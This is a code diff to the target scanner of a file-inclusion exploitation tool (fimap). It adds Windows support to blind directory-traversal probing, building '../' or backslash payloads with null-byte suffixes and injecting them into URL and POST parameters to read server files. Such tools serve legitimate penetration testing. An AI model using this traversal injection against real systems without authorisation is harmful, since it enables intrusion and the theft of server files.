@@ -25,6 +25,7 @@ from report import report
 import re,os
 import os.path
 import posixpath
+import ntpath
 
 __author__="Iman Karim(ikarim2s@smail.inf.fh-brs.de)"
 __date__ ="$30.08.2009 19:59:44$"
@@ -118,12 +119,12 @@ class targetScanner (baseClass.baseClass):
                             result.append((rep, self.readFiles(rep)))
         return(result)
 
-    def analyzeURLblindly(self, i, testfile, k, v, find, post=None, isPost=False):
+    def analyzeURLblindly(self, i, testfile, k, v, find, goBackSymbols, post=None, isPost=False, isUnix=True):
         tmpurl = self.Target_URL
         tmppost = post
         rep = None
         doBreak = False
-    
+        
         if (not isPost):
             tmpurl = tmpurl.replace("%s=%s"%(k,v), "%s=%s"%(k, testfile))
             
@@ -140,9 +141,9 @@ class targetScanner (baseClass.baseClass):
                 self._log("Possible file inclusion found blindly! -> '%s' with Parameter '%s'." %(tmpurl, k), self.LOG_ALWAYS)
                 doBreak = True
                 if (not isPost):
-                    rep = self.identifyVuln(self.Target_URL, self.params, k, post, isPost, blindmode=("/.." * i, False))
+                    rep = self.identifyVuln(self.Target_URL, self.params, k, post, None, isPost, (goBackSymbols * i, False), isUnix)
                 else:
-                    rep = self.identifyVuln(self.Target_URL, self.postparams, k, post, isPost, blindmode=("/.." * i, False))
+                    rep = self.identifyVuln(self.Target_URL, self.postparams, k, post, None, isPost, (goBackSymbols * i, False), isUnix)
             else:
                 tmpurl = self.Target_URL
                 tmpfile = testfile + "%00"
@@ -164,7 +165,7 @@ class targetScanner (baseClass.baseClass):
                     else:
                         self._log("Possible file inclusion found blindly! -> '%s' with POST-Parameter '%s'." %(tmpurl, k), self.LOG_ALWAYS)
                     doBreak = True
-                    rep = self.identifyVuln(self.Target_URL, self.params, k, post, isPost, blindmode=("/.." * i, True))
+                    rep = self.identifyVuln(self.Target_URL, self.params, k, post, None, isPost, (goBackSymbols * i, True), isUnix)
         else:
             # Previous result was none. Assuming that we can break here.
             self._log("Code == None. Skipping testing of the URL.", self.LOG_DEBUG)
@@ -192,20 +193,25 @@ class targetScanner (baseClass.baseClass):
                 post = fileobj.getPostData()
                 v    = fileobj.getFindStr()
                 f    = fileobj.getFilepath()
+                
+                backSym = fileobj.getBackSymbols()
                 for i in range(xml2config.getBlindMin(), xml2config.getBlindMax()):
                     doBreak = False
                     testfile = f
                     if (i > 0):
-                        testfile = "/.." * i + f
+                        tmpf = f
+                        if (fileobj.isWindows()):
+                            tmpf = f[f.find(":")+1:]
+                        testfile = backSym * i + tmpf
                     rep = None
                     for k,V in self.params.items():
-                        rep, doBreak = self.analyzeURLblindly(i, testfile, k, V, v, self.config["p_post"], False)
+                        rep, doBreak = self.analyzeURLblindly(i, testfile, k, V, v, backSym, self.config["p_post"], False, fileobj.isUnix())
                         if (rep != None):
                             rep.setVulnKeyVal(V)
                             rep.setPostData(self.config["p_post"])
                             ret.append((rep, self.readFiles(rep)))
                     for k,V in self.postparams.items():
-                        rep, doBreak = self.analyzeURLblindly(i, testfile, k, V, v, self.config["p_post"], True)
+                        rep, doBreak = self.analyzeURLblindly(i, testfile, k, V, v, backSym, self.config["p_post"], True, fileobj.isUnix())
                         if (rep != None):
                             rep.setVulnKeyVal(V)
                             rep.setPostData(self.config["p_post"])
@@ -216,7 +222,7 @@ class targetScanner (baseClass.baseClass):
 
 
 
-    def identifyVuln(self, URL, Params, VulnParam, PostData, Language, isPost=False, blindmode=None):
+    def identifyVuln(self, URL, Params, VulnParam, PostData, Language, isPost=False, blindmode=None, isUnix=None):
         xml2config = self.config["XML2CONFIG"]
         
         if (blindmode == None):
@@ -322,11 +328,24 @@ class targetScanner (baseClass.baseClass):
                 #    if pre[-1] != "/":
                 #       addSlash = True
 
+
+                rootdir = None
+                
                 if (pre[0] != "/"):
-                    pre = posixpath.join(r.getServerPath(), pre)
-                    pre = posixpath.normpath(pre)
-                pre = self.relpath("/", pre)
-                if addSlash: pre = "/" + pre
+                    if (r.isUnix()):
+                        pre = posixpath.join(r.getServerPath(), pre)
+                        pre = posixpath.normpath(pre)
+                        rootdir = "/"
+                        pre = posixpath.relpath(rootdir, pre)
+                    else:
+                        pre = ntpath.join(r.getServerPath(), pre)
+                        pre = ntpath.normpath(pre)
+                        if (pre[1] == ":"):
+                            rootdir = pre[0:3]
+                        pre = ntpath.relpath(rootdir, pre)
+                else:
+                    pre = posixpath.relpath("/", pre)
+                if addSlash: pre = rootdir + pre
                 sur = tokens[1]
                 if (pre == "."): pre = ""
                 r.setPrefix(pre)
@@ -380,6 +399,8 @@ class targetScanner (baseClass.baseClass):
                 r.setServerPath(prefix.replace("..", "a"))
             r.setServerScript("noop")
             r.setPrefix(prefix)
+            if (not isUnix):
+                r.setWindows()
             return(r)
 
 
@@ -571,6 +592,8 @@ class targetScanner (baseClass.baseClass):
         surfix = report.getSurfix()
         vuln   = report.getVulnKey()
         params = report.getParams()
+        isunix = report.isUnix()
+        
         scriptpath = report.getServerPath()
         
         postdata = None
@@ -586,13 +609,15 @@ class targetScanner (baseClass.baseClass):
 
         if (filepath[0] == "/"):
             filepatha = prefix + filepath
+        if (report.isWindows() and len(prefix.strip()) > 0 and not isAbs):
+            filepatha = prefix + filepath[3:]
         elif len(prefix.strip()) > 0 and not isAbs:
-            filepatha = prefix + "/" +filepath
+            filepatha = prefix + "/" + filepath
         else:
             filepatha = filepath
 
 
-        if (scriptpath[-1] != "/" and filepatha[0] != "/" and not isAbs):
+        if (scriptpath[-1] != "/" and filepatha[0] != "/" and not isAbs and report.isUnix()):
             filepatha = "/" + filepatha
 
         payload = "%s%s"%(filepatha, surfix)
